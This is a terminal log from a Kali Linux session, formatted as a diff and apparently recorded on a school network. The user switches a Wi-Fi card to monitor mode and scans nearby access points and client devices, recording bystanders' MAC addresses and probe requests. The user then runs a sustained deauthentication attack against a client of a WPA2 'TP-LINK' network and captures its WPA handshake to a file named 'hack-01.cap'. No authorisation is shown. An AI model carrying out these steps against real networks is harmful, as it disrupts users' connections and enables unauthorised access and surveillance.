@@ -1,0 +1,833 @@
+┌──(user㉿kali)-[~]
+└─$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
+    link/ether c8:5b:76:32:19:cb brd ff:ff:ff:ff:ff:ff
+4: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether e4:b3:18:7a:4c:66 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.90.160/32 scope global dynamic noprefixroute wlan0
+       valid_lft 540sec preferred_lft 540sec
+    inet6 fe80::fb94:bb0b:ba6e:362/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+
+┌──(user㉿kali)-[~]
+└─$ iwconfig
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE 802.11  ESSID:"KHK opilane"  
+          Mode:Managed  Frequency:5.18 GHz  Access Point: 98:44:CE:9A:F1:E3   
+          Tx-Power=22 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          Link Quality=68/70  Signal level=-42 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:2  Invalid misc:6   Missed beacon:0
+
+
+┌──(user㉿kali)-[~]
+└─$ ^C
+
+┌──(user㉿kali)-[~]
+└─$ sudo ifconfig wlan0 down
+[sudo] password for user: 
+
+┌──(user㉿kali)-[~]                                                                                              
+└─$ ^C                                                                                                           
+                                                                                                                 
+┌──(user㉿kali)-[~]                                                                                              
+└─$ iwconfig                                                                                     
+lo        no wireless extensions.                                                                                
+                                                                                                                 
+eth0      no wireless extensions.                                                                                
+                                                                                                                 
+wlan0     IEEE 802.11  ESSID:off/any                                                                             
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=22 dBm                                           
+          Retry short limit:7   RTS thr:off   Fragment thr:off                                                   
+          Power Management:on                                                                                    
+                                                                                                                 
+                                                                                                                 
+┌──(user㉿kali)-[~]                                                                                              
+└─$ sudo airmon-ng check kill                                                                                    
+                                                                                                                 
+Killing these processes:                                                                                         
+                                                                                                                 
+    PID Name                                                                                                     
+    830 wpa_supplicant                                                                                           
+                                                                                                                 
+                                                                                                                 
+┌──(user㉿kali)-[~]
+└─$ sudo airmon-ng check kill
+
+
+
+┌──(user㉿kali)-[~]
+└─$ sudo airmon-ng start wlan0
+
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           iwlwifi         Intel Corporation Wireless 8260 (rev 3a)
+                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+
+
+┌──(user㉿kali)-[~]
+└─$ iwconfig                                                                                                        
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+
+┌──(user㉿kali)-[~]
+└─$ ip a                                                                                                            
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
+    link/ether c8:5b:76:32:19:cb brd ff:ff:ff:ff:ff:ff
+5: wlan0mon: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/ieee802.11/radiotap e4:b3:18:7a:4c:66 brd ff:ff:ff:ff:ff:ff
+
+┌──(user㉿kali)-[~]
+└─$ sudo ifconfig wlan0mon up
+
+┌──(user㉿kali)-[~]
+└─$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
+    link/ether c8:5b:76:32:19:cb brd ff:ff:ff:ff:ff:ff
+5: wlan0mon: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/ieee802.11/radiotap e4:b3:18:7a:4c:66 brd ff:ff:ff:ff:ff:ff
+
+┌──(user㉿kali)-[~]
+└─$ sudo airodump-ng wlan0mon
+
+ CH  7 ][ Elapsed: 5 mins ][ 2025-12-17 12:13                                                                       
+                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                    
+                                                                                                                    
+ 26:EE:0D:B4:0B:EB  -58       69        3    0   6  130   WPA2 CCMP   PSK  iFoon                                    
+ 06:54:D7:DA:8E:BC  -44      115        0    0   6  130   WPA2 CCMP   PSK  Kasutaja avely A55                       
+ 98:44:CE:9A:E4:33   -1        0        0    0   5   -1                    <length:  0>                             
+ 98:44:CE:9A:ED:B0  -87       48        0    0   9  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:ED:B3  -88       29        0    0   9  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:53  -53      242        0    0   5  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:50  -52      325        0    0   5  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:F1:73  -76      134        0    0   9  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F1:70  -84      153        0    0   9  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:EF:B0  -80      190        0    0   9  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:EF:B3  -79      174        0    0   9  360   OPN              KHK opilane                              
+ 98:44:CE:9A:E8:50  -87      112        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:E8:53  -83      118        0    0  13  360   OPN              KHK opilane                              
+ 98:44:CE:9A:EA:D3  -73      172        0    0  13  360   OPN              KHK opilane                              
+ 98:44:CE:9A:EA:D0  -71      188        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:F2:33  -84       95        0    0  13  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:30  -85      112        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ E8:DE:27:B0:66:72  -67      684      552    0  11  270   WPA2 CCMP   PSK  TP-LINK                                  
+ E4:8D:8C:EE:10:95  -77      206        0    0   1   54 . OPN              MikroTik                                 
+ 98:44:CE:9A:F1:D0  -41      256        0    0   1  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:F1:D3  -42      243       70    0   1  360   OPN              KHK opilane                              
+                                                                                                                    
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                  
+                                                                                                                    
+ 98:44:CE:9A:E4:33  D4:AB:CD:9E:6F:7F  -86    0 - 1      0        7                                                 
+ (not associated)   26:3D:81:E8:22:98  -59    0 - 1      0        2                                                 
+ (not associated)   EE:1F:CF:52:3F:FB  -86    0 - 1      0        4         pullman public                          
+ (not associated)   22:E9:72:E7:9A:8F  -84    0 - 5      0        1                                                 
+ (not associated)   FA:25:61:D8:84:8D  -59    0 - 1      0        1                                                 
+ (not associated)   D2:8E:A8:6B:C2:43  -56    0 - 1      0        1                                                 
+ (not associated)   42:A6:62:7A:B2:F8  -55    0 - 1      0        1                                                 
+ (not associated)   66:4C:BB:A4:46:D4  -45    0 - 5      0        1                                                 
+ (not associated)   46:91:8C:80:97:BE  -52    0 - 1      0        2                                                 
+ (not associated)   12:87:C2:5D:7B:95  -60    0 - 1      0        2                                                 
+ (not associated)   36:AE:38:5C:A3:90  -87    0 - 1      0        1                                                 
+ (not associated)   82:A0:40:6D:41:94  -77    0 - 5      0        1                                                 
+ (not associated)   FA:F7:C6:AD:B4:CF  -86    0 - 1      0        2                                                 
+ (not associated)   7A:96:39:DB:F6:82  -85    0 - 1      0        1                                                 
+ (not associated)   62:3D:A0:1C:A1:B1  -40    0 - 5      0        3                                                 
+ (not associated)   76:26:56:E6:02:10  -86    0 - 5      0        1                                                 
+ (not associated)   C6:C2:11:43:AC:0B  -52    0 - 1      0        1                                                 
+ (not associated)   9A:29:F4:9B:28:F0  -54    0 - 1      0        1                                                 
+ (not associated)   B2:4E:D0:44:B0:A7  -58    0 - 1      0        1                                                 
+ (not associated)   62:74:6D:FD:79:58  -63    0 - 1      0        2                                                 
+ (not associated)   CA:65:F3:AF:C8:C1  -46    0 - 1      0        4                                                 
+ (not associated)   62:2F:EB:19:9E:4A  -66    0 - 1      0        2                                                 
+ (not associated)   52:4A:CE:EA:69:18  -50    0 - 1      0       13                                                 
+ (not associated)   EE:4E:22:8D:DF:81  -61    0 - 1      0        1                                                 
+ (not associated)   F2:50:76:CC:9E:33  -49    0 - 1      0        1                                                 
+ (not associated)   12:54:31:B7:F7:DC  -50    0 - 1      0        1                                                 
+ (not associated)   3A:D6:7C:12:38:E8  -51    0 - 1      0        1                                                 
+ (not associated)   66:BE:5F:E3:55:70  -61    0 - 1      0        2                                                 
+ (not associated)   56:3B:82:F7:92:86  -58    0 - 1      0        1                                                 
+ (not associated)   4A:97:A0:5C:C6:6D  -58    0 - 1      0        2                                                  (not associated)   C6:B2:58:A3:14:6E  -57    0 - 1      0        1                                                 
+ (not associated)   36:A9:D2:05:9F:CF  -54    0 - 1      0        1                                                 
+Quitting...                                                                                                         
+                                                                                                                    
+┌──(user㉿kali)-[~]                                                                                                 
+└─$ ^C                                                                                                              
+
+┌──(user㉿kali)-[~]
+└─$ ^C                                                                                                              
+
+┌──(user㉿kali)-[~]
+└─$ sudo airodump-ng --band a wlan0mon
+
+ CH 153 ][ Elapsed: 4 mins ][ 2025-12-17 12:20                                                                      
+                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                    
+                                                                                                                    
+ 98:44:CE:9A:F1:C3  -39        0        0    0  -1   -1                    <length:  0>                             
+ 98:44:CE:9A:F1:83   -1        0        0    0  52   -1                    <length:  0>                             
+ 98:44:CE:9A:EA:E3  -85       91        0    0 132  720   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:43  -86       92        0    0 124  720   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:63  -53      100       26    0 116  720   OPN              KHK opilane                              
+ 98:44:CE:9A:EF:C3  -82      101        0    0  60  720   OPN              KHK opilane                              
+ F6:9F:C2:69:5D:06  -46      104        0    0  48  720   WPA2 CCMP   PSK  It21-5g                                  
+ 98:44:CE:9A:F1:E3  -43      105       56    0  36  720   OPN              KHK opilane                              
+                                                                                                                    
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                  
+                                                                                                                    
+ 98:44:CE:9A:F1:83  BC:D7:13:91:B7:11  -82    0 - 6e     0       37         KHK opilane                             
+ 98:44:CE:9A:F2:43  B8:31:B5:98:4C:CB  -47    0 - 6      0       98                                                 
+ 98:44:CE:9A:F2:63  E0:0A:F6:68:70:FB  -85    0 - 6      0        5                                                 
+ 98:44:CE:9A:F2:63  28:C2:1F:87:D1:EA  -86    0 - 6      0       31                                                 
+ 98:44:CE:9A:F2:63  5A:3E:2A:BE:C2:8F  -78    0 - 6e    76      149         KHK opilane,LLD-L31%7927%CloudClone,LLD-
+ 98:44:CE:9A:F2:63  6C:7E:67:D1:E7:68  -88    0 - 6    148        4                                                 
+ 98:44:CE:9A:F2:63  70:8C:F2:B3:28:D7  -54    0 -24     39       71                                                 
+ (not associated)   16:41:0A:78:29:0A  -61    0 - 6      0        1                                                 
+ (not associated)   7A:79:5B:CB:BB:4B  -61    0 - 6      0        1                                                 
+ (not associated)   B2:AA:23:90:B5:BA  -58    0 - 6     42        2                                                 
+ (not associated)   EE:0B:AC:4D:50:03  -44    0 - 6      0        1                                                 
+ (not associated)   3E:69:5B:8E:30:24  -44    0 - 6      0        1                                                  (not associated)   6E:82:24:50:8F:8D  -54    0 - 6      0        1                                                 
+ (not associated)   96:EF:D7:79:6B:F3  -54    0 - 6      0        1                                                 
+ (not associated)   12:FD:9A:E8:D5:6F  -77    0 - 6      0        2                                                 
+ (not associated)   E6:34:8E:3F:DE:8D  -69    0 - 6      0        2                                                 
+ (not associated)   8E:BB:7C:F4:48:58  -57    0 - 6      0        2                                                 
+ (not associated)   72:04:8C:A8:85:E8  -83    0 - 6      0        2                                                 
+ (not associated)   FA:72:E9:D2:FF:9D  -76    0 - 6      0        1                                                 
+ (not associated)   F6:50:9A:41:20:B4  -60    0 - 6      0        2                                                 
+ (not associated)   98:44:CE:9A:F1:83  -90    0 - 6    160        3         huawei_neighbor_discovery               
+ (not associated)   98:44:CE:9A:EF:C3  -86    0 - 6    151       14         huawei_neighbor_discovery               
+ (not associated)   98:44:CE:9A:EA:E3  -84    0 - 6    152        8         huawei_neighbor_discovery               
+ (not associated)   98:44:CE:9A:F1:E3  -35    0 - 6    147       15         huawei_neighbor_discovery               
+ (not associated)   C2:88:AA:6F:E8:6C  -60    0 - 6      0        2                                                 
+ (not associated)   BA:BD:48:C4:2A:A5  -90    0 - 6      0        1                                                 
+ (not associated)   F6:82:23:C7:D3:B4  -57    0 - 6      0        5                                                 
+ (not associated)   98:44:CE:9A:F2:43  -88    0 - 6      0        6         huawei_neighbor_discovery               
+ 98:44:CE:9A:F1:E3  E4:B3:18:8A:99:45  -44    0 - 6      0       10                                                 
+Quitting...                                                                                                         
+                                                                                                                    
+┌──(user㉿kali)-[~]                                                                                                 
+└─$ sudo airodump-ng --band abg wlan0mon                                                                            
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+                                                                                                                    
+
+ CH 144 ][ Elapsed: 56 mins ][ 2025-12-17 13:16                                                                     
+                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                    
+                                                                                                                    
+ 98:44:CE:9A:F1:53  -88      148        0    0  13  360   OPN              KHK opilane                              
+ 98:44:CE:9A:EE:30  -88       54        0    0   5  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:EE:33  -88       56        0    0   5  360   OPN              KHK opilane                              
+ 98:44:CE:9A:ED:B0  -88      161        0    0   9  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:ED:B3  -89      142        0    0   9  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:30  -82      209        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:F1:50  -88      206        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:EA:E3  -85     1012        2    0 132  720   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:63  -51     1043      756    0 116  720   OPN              KHK opilane                              
+ 98:44:CE:9A:EF:C3  -82     1019        0    0  60  720   OPN              KHK opilane                              
+ 98:44:CE:9A:F1:83  -42       11        1    0  52  720   OPN              KHK opilane                              
+ F6:9F:C2:69:5D:06  -46     1068        0    0  48  720   WPA2 CCMP   PSK  It21-5g                                  
+ 98:44:CE:9A:F2:43  -88      983        0    0 124  720   OPN              KHK opilane                              
+ 98:44:CE:9A:F1:E3  -40     1045      644    0  36  720   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:53  -55      562        2    0   5  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F2:50  -54      635        0    0   5  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:EF:B0  -79      476        0    0   9  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:F1:73  -85      427        4    0   9  360   OPN              KHK opilane                              
+ 98:44:CE:9A:F1:70  -85      432        0    0   9  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:EF:B3  -81      451        1    0   9  360   OPN              KHK opilane                              
+ 98:44:CE:9A:E8:50  -84      296        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:F2:33  -85      352        2    0  13  360   OPN              KHK opilane                              
+ 98:44:CE:9A:EA:D3  -74      450        7    0  13  360   OPN              KHK opilane                              
+ 98:44:CE:9A:EA:D0  -73      509        0    0  13  360   WPA3 CCMP   SAE  <length:  1>                             
+ 98:44:CE:9A:E8:53  -83      307        0    0  13  360   OPN              KHK opilane                              
+ F0:9F:C2:69:5D:07  -42      712       28    0   6  260   WPA2 CCMP   PSK  It21                                     
+ E8:DE:27:B0:66:72  -17     1672     2288    0  11  270   WPA2 CCMP   PSK  TP-LINK                                  
+ 98:44:CE:9A:F1:D0  -44      745        0    0   1  360   WPA3 CCMP   SAE  <length:  1>                             
+ E4:8D:8C:EE:10:95  -68      488        0    0   1   54 . OPN              MikroTik                                 
+ 98:44:CE:9A:F1:D3  -45      628       70    0   1  360   OPN              KHK opilane                              
+                                                                                                                    
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                  
+                                                                                                                    
+ 98:44:CE:9A:F2:63  6C:7E:67:D1:E7:68  -86    0 - 6      0       96         KHK opilane                             
+ 98:44:CE:9A:F2:63  B8:31:B5:98:4C:CB  -50    0 - 6     39      934                                                 
+ 98:44:CE:9A:F1:83  BC:D7:13:91:B7:11  -86    0 - 6e     0      459         KHK opilane                             
+ 98:44:CE:9A:F1:E3  E4:B3:18:8A:99:45  -55    0 - 6e     0      113                                                 
+ (not associated)   A6:59:21:50:6B:2F  -59    0 - 1      0        2                                                  (not associated)   AE:19:0F:34:8A:0B  -49    0 - 6      0        1                                                 
+ (not associated)   1A:B2:1B:CA:DE:30  -49    0 - 6      0        1         Allan                                   
+ (not associated)   D2:CC:F0:69:64:97  -41    0 - 1      0        1                                                 
+ (not associated)   C6:4A:8C:C0:23:C4  -68    0 - 6      0        1                                                 
+ (not associated)   26:38:00:CA:F4:B8  -68    0 - 6      0        1                                                 
+ (not associated)   DE:FC:50:30:4C:97  -40    0 - 6      0        1                                                  (not associated)   36:FE:D5:8F:C5:49  -40    0 - 6      0        1                                                  (not associated)   AA:7C:53:E1:BC:07  -53    0 - 6      0        1                                                 
+ (not associated)   02:22:C4:1C:DF:05  -53    0 - 6      0        1         Allan                                    (not associated)   26:13:C7:D0:FF:2E  -40    0 - 1      0        1                                                 
+ (not associated)   5E:91:6C:C6:66:07  -41    0 - 1      0        1                                                 
+ (not associated)   0E:08:BB:48:C7:91  -41    0 - 1      0        1                                                  (not associated)   8E:FE:10:6A:A9:B8  -41    0 - 1      0        1         Allan                                   
+ (not associated)   CE:C5:6A:0C:DC:99  -43    0 - 1      0        1                                                 
+ (not associated)   A6:5C:A0:95:36:1C  -43    0 - 1      0        1         Allan                                   
+ (not associated)   1E:68:55:14:97:E9  -43    0 - 1      0        1                                                 
+ (not associated)   96:81:88:2E:C8:D8  -42    0 - 1      0        1         Allan                                    (not associated)   CE:18:C2:CB:8F:99  -40    0 - 1      0        1         Allan                                   
+Quitting...                                                                                                         
+                                                                                                                    
+┌──(user㉿kali)-[~]                                                                                                 
+└─$ sudo airodump-ng --bssid E8:DE:27:B0:66:72 --channel 11
+[sudo] password for user: 
+No interface specified.
+"airodump-ng --help" for help.
+
+┌──(user㉿kali)-[~]
+└─$ sudo airodump-ng --bssid E8:DE:27:B0:66:72 --channel 11 wlan0mon                                                
+
+ CH 11 ][ Elapsed: 1 min ][ 2025-12-17 13:20 ][ WPA handshake: E8:DE:27:B0:66:72                                    
+                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                
+                                                                                                                    
+ E8:DE:27:B0:66:72  -16 100     1056     9982   54  11  270   WPA2 CCMP   PSK  TP-LINK                              
+                                                                                                                    
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                  
+                                                                                                                    
+ E8:DE:27:B0:66:72  A0:52:72:41:9F:A3  -49   24e-24      4     2102  EAPOL                                           E8:DE:27:B0:66:72  70:8C:F2:B3:28:D7  -47   24e-24   3261     6456  EAPOL                                          Quitting...                                                                                                         
+                                                                                                                    
+┌──(user㉿kali)-[~]                                                                                                 
+└─$ sudo aireplay-ng --deauth 60 -a E8:DE:27:B0:66:72 -c 70:8C:F2:B3:28:D7 wlan0mon
+13:27:11  Waiting for beacon frame (BSSID: E8:DE:27:B0:66:72) on channel 11
+13:27:12  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [13|97 ACKs]                              
+13:27:12  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|200 ACKs]                             
+13:27:13  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 3|212 ACKs]                             
+13:27:13  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|254 ACKs]                             
+13:27:14  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|263 ACKs]                             
+13:27:15  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|267 ACKs]                             
+13:27:15  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 2|294 ACKs]                             
+13:27:16  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|286 ACKs]                             
+13:27:17  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [11|319 ACKs]                             
+13:27:17  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|324 ACKs]                             
+13:27:18  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [41|366 ACKs]                             
+13:27:19  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [20|275 ACKs]                             
+13:27:19  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [18|304 ACKs]                             
+13:27:20  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 2|330 ACKs]                             
+13:27:20  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|358 ACKs]                             
+13:27:21  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|374 ACKs]                             
+13:27:22  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|409 ACKs]                             
+13:27:22  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|427 ACKs]                             
+13:27:23  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|405 ACKs]                             
+13:27:24  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|410 ACKs]                             
+13:27:24  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 4|414 ACKs]                             
+13:27:25  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|402 ACKs]                             
+13:27:26  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|405 ACKs]                             
+13:27:26  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|403 ACKs]                             
+13:27:27  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|386 ACKs]                             
+13:27:27  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|369 ACKs]                             
+13:27:28  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|403 ACKs]                             
+13:27:29  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|388 ACKs]                             
+13:27:29  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|396 ACKs]                             
+13:27:30  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 2|413 ACKs]                             
+13:27:31  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 2|422 ACKs]                             
+13:27:31  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|391 ACKs]                             
+13:27:32  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 2|365 ACKs]                             
+13:27:33  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [18|336 ACKs]                             
+13:27:33  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [22|340 ACKs]                             
+13:27:34  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [13|381 ACKs]                             
+13:27:35  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [14|348 ACKs]                             
+13:27:35  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 7|382 ACKs]                             
+13:27:36  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [15|411 ACKs]                             
+13:27:36  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 5|379 ACKs]                             
+13:27:37  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 6|400 ACKs]                             
+13:27:38  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|402 ACKs]                             
+13:27:38  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 3|405 ACKs]                             
+13:27:39  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|394 ACKs]                             
+13:27:40  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|407 ACKs]                             
+13:27:40  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|415 ACKs]                             
+13:27:41  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 4|391 ACKs]                             
+13:27:41  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|409 ACKs]                             
+13:27:42  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 2|402 ACKs]
+13:27:43  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 3|438 ACKs]
+13:27:43  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|411 ACKs]
+13:27:44  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|395 ACKs]
+13:27:45  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 1|386 ACKs]
+13:27:45  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|368 ACKs]
+13:27:46  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|359 ACKs]
+13:27:46  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|357 ACKs]
+13:27:47  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|306 ACKs]
+13:27:48  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|286 ACKs]
+13:27:48  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|208 ACKs]
+13:27:49  Sending 64 directed DeAuth (code 7). STMAC: [70:8C:F2:B3:28:D7] [ 0|176 ACKs]
+
+┌──(user㉿kali)-[~]
+└─$ sudo airodump-ng --bssid E8:DE:27:B0:66:72 --channel 11 wlan0mon --write hack                    
+[sudo] password for user: 
+13:44:27  Created capture file "hack-01.cap".
+
+ CH 11 ][ Elapsed: 54 s ][ 2025-12-17 13:45 ][ WPA handshake: E8:DE:27:B0:66:72                                     
+                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                
+                                                                                                                    
+ E8:DE:27:B0:66:72  -17 100      565     8872   20  11  270   WPA2 CCMP   PSK  TP-LINK                              
+                                                                                                                    
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                  
+                                                                                                                    
+ E8:DE:27:B0:66:72  7E:B6:F6:B5:AD:8C  -51    0 - 1      0        1         TP-LINK                                 
+ E8:DE:27:B0:66:72  7A:C3:CD:3D:45:A6  -53    0 - 1      0       10                                                  E8:DE:27:B0:66:72  70:8C:F2:B3:28:D7  -42   24e-24    667     5711  EAPOL                                           E8:DE:27:B0:66:72  A0:52:72:41:9F:A3  -47   11e-24e   306     2657  EAPOL                                          
+Quitting...                                                                                                         
+                                                                                                                    
